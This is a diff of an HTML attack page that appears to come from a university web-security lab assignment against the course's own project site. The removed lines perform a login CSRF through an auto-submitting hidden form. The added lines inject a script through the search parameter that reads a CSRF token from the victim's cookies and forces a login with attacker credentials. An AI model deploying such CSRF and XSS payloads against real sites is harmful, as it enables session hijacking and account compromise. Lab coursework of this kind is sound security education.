@@ -1,20 +1,38 @@
 <!DOCTYPE html>
-<head>
-    <meta name="https://project2.ecen4133.org" content="never"
-</head>
-<body>
-
-
-<form id="myForm" action="https://project2.ecen4133.org/login" method="post" target="frame">
-  <input type="hidden" id="username" name="username" value="attacker" />
-  <input type="hidden" id="userpass" name="password" value="l33th4x"  />
-  <input type="hidden" name="xssdefense" value="0" />
-  <input type="hidden" name="csrfdefense" value="1" />
-  <input type="hidden" name="csrf_token" value="807ac5208cf8af427da42bdb5e8a72cd"/>
-</form>
-<iframe name="frame" hidden></iframe>
-<script>
-    document.getElementById('myForm').submit();
-</script>
-</body>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <title>CSRF_1</title>
+        <script
+            src="https://code.jquery.com/jquery-1.12.4.min.js"
+            integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ="
+            crossorigin="anonymous"
+        ></script>
+    </head>
+    <body>
+        <iframe id="frame" name="frame" hidden></iframe>
+        <form
+            id="myForm"
+            action="https://project2.ecen4133.org/search?csrfdefense=1&xssdefense=0"
+            method="GET"
+            target="frame"
+        >
+            <input
+                type="hidden"
+                id="query"
+                name="q"
+                value="
+                  <script>
+                    $(function(){
+                      var pwned = document.cookie.split(';')[1].split('-')[1];
+                      var url = 'http://project2.ecen4113.org/' + 'login?csrfdefense=1&xssdefense=0'
+                      $.post(url, { username: 'attacker', password: 'l33th4x', csrf_token: pwned});
+                    });
+                  </script>"
+            />
+        </form>
+        <script>
+          document.getElementById('myForm').submit();
+        </script>
+    </body>
 </html>
